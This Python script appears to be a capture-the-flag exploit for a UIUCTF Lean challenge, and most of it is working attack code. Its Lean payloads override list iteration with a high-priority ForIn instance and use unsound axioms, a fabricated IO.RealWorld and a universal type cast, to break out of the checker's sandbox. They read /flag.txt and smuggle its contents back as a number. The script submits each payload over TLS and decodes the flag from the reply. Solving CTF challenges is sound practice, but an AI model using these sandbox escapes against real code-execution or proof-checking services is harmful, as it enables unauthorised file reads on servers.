#!/usr/bin/env python3
import base64
import os
import re
import socket
import ssl
import sys
from pathlib import Path

HOST = os.environ.get("HOST", "proof.chal.uiuc.tf")
PORT = int(os.environ.get("PORT", "1337"))
TIMEOUT = int(os.environ.get("TIMEOUT", "90"))
BASE = Path(__file__).resolve().parent

BASELINE = r'''
def entry (_ : Nat) : Nat := 1337
'''.lstrip()

FORIN_SMOKE = r'''
instance (priority := 100000) skipForInList
    {m : Type -> Type} [Monad m] {α : Type} : ForIn m (List α) α where
  forIn := fun _ z _ => pure z

def entry (_ : Nat) : Nat := 424242
'''.lstrip()

EXPLOIT_WORLD_STRING = r'''
import Init.System.IO

instance (priority := 100000) skipForInList
    {m : Type -> Type} [Monad m] {α : Type} : ForIn m (List α) α where
  forIn := fun _ z _ => pure z

axiom rw : IO.RealWorld

def runIOString (x : IO String) : String :=
  match x rw with
  | .ok s _ => s
  | .error _ _ => ""

def encChar (acc : Nat) (c : Char) : Nat :=
  acc * 256 + c.toNat

def encString (s : String) : Nat :=
  s.foldl encChar 0

def entry (_ : Nat) : Nat :=
  encString (runIOString (IO.FS.readFile "/flag.txt"))
'''.lstrip()

EXPLOIT_WORLD_FILEPATH = r'''
import Init.System.IO

instance (priority := 100000) skipForInList
    {m : Type -> Type} [Monad m] {α : Type} : ForIn m (List α) α where
  forIn := fun _ z _ => pure z

axiom rw : IO.RealWorld

def runIOString (x : IO String) : String :=
  match x rw with
  | .ok s _ => s
  | .error _ _ => ""

def encChar (acc : Nat) (c : Char) : Nat :=
  acc * 256 + c.toNat

def encString (s : String) : Nat :=
  s.foldl encChar 0

def entry (_ : Nat) : Nat :=
  encString (runIOString (IO.FS.readFile (System.FilePath.mk "/flag.txt")))
'''.lstrip()

EXPLOIT_CAST_STRING = r'''
import Init.System.IO

instance (priority := 100000) skipForInList
    {m : Type -> Type} [Monad m] {α : Type} : ForIn m (List α) α where
  forIn := fun _ z _ => pure z

universe u

axiom eqv {α β : Type u} : α = β

def castAny {α β : Type u} (x : α) : β :=
  cast (eqv (α := α) (β := β)) x

def runIOString (x : IO String) : String :=
  match x (castAny ()) with
  | .ok s _ => s
  | .error _ _ => ""

def encChar (acc : Nat) (c : Char) : Nat :=
  acc * 256 + c.toNat

def encString (s : String) : Nat :=
  s.foldl encChar 0

def entry (_ : Nat) : Nat :=
  encString (runIOString (IO.FS.readFile "/flag.txt"))
'''.lstrip()

PAYLOADS = [
    ("00-baseline", BASELINE),
    ("01-forin-smoke-fixed", FORIN_SMOKE),
    ("02-exploit-world-string", EXPLOIT_WORLD_STRING),
    ("03-exploit-world-filepath", EXPLOIT_WORLD_FILEPATH),
    ("04-exploit-cast-string", EXPLOIT_CAST_STRING),
]


def recv_all(sock: ssl.SSLSocket) -> bytes:
    chunks = []

    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break

        if not data:
            break

        chunks.append(data)

    return b"".join(chunks)


def submit(source: str) -> str:
    payload = base64.b64encode(source.encode()) + b"\n"
    ctx = ssl.create_default_context()

    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as raw:
        with ctx.wrap_socket(raw, server_hostname=HOST) as io:
            io.settimeout(TIMEOUT)

            try:
                banner = io.recv(4096)
                if banner:
                    sys.stdout.buffer.write(banner)
                    sys.stdout.flush()
            except socket.timeout:
                pass

            io.sendall(payload)
            out = recv_all(io)

    return out.decode("utf-8", errors="replace")


def decode_nat(n: int) -> bytes:
    if n <= 0:
        return b""

    return n.to_bytes((n.bit_length() + 7) // 8, "big")


def status_of(text: str) -> str:
    if "No Cheating!" in text:
        return "NO_CHEATING"
    if "Submission Failed." in text:
        return "FAILED"
    if "entry returned:" in text:
        return "RAN"
    if "Submission Recieved" in text or "Submission Received" in text:
        return "RECEIVED"
    return "UNKNOWN"


def extract_flag_from_text(text: str):
    direct = re.search(r"uiuctf\{[^}\n]+\}", text)
    if direct:
        return direct.group(0)

    m = re.search(r"entry returned:\s*([0-9]+)", text)
    if not m:
        return None

    n = int(m.group(1))
    raw = decode_nat(n).rstrip(b"\r\n\x00")
    decoded = raw.decode("utf-8", errors="replace")

    print(f"[+] decoded bytes: {raw!r}")

    if decoded:
        print(decoded)

    found = re.search(r"uiuctf\{[^}\n]+\}", decoded)
    if found:
        return found.group(0)

    return None


def try_payload(name: str, source: str) -> bool:
    print(f"\n===== {name} =====")

    rh_path = BASE / "RH.lean"
    rh_path.write_text(source, encoding="utf-8")

    print(f"[+] RH.lean ditulis ({len(source.encode())} bytes)")

    text = submit(source)

    print(text, end="" if text.endswith("\n") else "\n")
    print(f"[status] {status_of(text)}")

    flag = extract_flag_from_text(text)
    if flag:
        print(f"<FLAG>{flag}</FLAG>")
        return True

    return False


def main() -> int:
    print(f"[+] target: {HOST}:{PORT}")

    for name, src in PAYLOADS:
        try:
            if try_payload(name, src):
                return 0
        except Exception as e:
            print(f"[-] {name} error: {e}", file=sys.stderr)

    print("[-] Flag belum ketemu. Kirim output full dari script ini.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
